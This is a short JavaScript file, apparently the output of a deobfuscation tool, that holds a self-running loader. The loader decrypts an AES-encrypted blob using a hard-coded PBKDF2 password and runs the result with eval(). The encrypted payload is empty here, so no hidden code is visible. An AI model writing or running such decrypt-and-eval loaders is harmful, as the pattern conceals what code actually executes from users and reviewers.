//Thu Sep 04 2025 05:19:37 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
const crypto = require("crypto");
(function () {
  try {
    const _0x1a2cc6 = "";
    const _0x54bff3 = Buffer.from(_0x1a2cc6, "base64").toString("utf8");
    const _0x1ee455 = JSON.parse(_0x54bff3);
    const _0xaf32f0 = crypto.pbkdf2Sync("mHJ{P0j[}q)DIE`1L&,nuuaU4UKkgGth", Buffer.from(_0x1ee455.salt, "hex"), _0x1ee455.iter, 32, "sha1");
    const _0x4cabc2 = crypto.createDecipheriv("aes-256-cbc", _0xaf32f0, Buffer.from(_0x1ee455.iv, "hex"));
    let _0x22d9cb = _0x4cabc2.update(Buffer.from(_0x1ee455.ct, "base64"));
    _0x22d9cb = Buffer.concat([_0x22d9cb, _0x4cabc2.final()]);
    eval(_0x22d9cb.toString("utf8"));
  } catch (_0xd16fc0) {
    console.error("解密失败:", _0xd16fc0);
  }
})();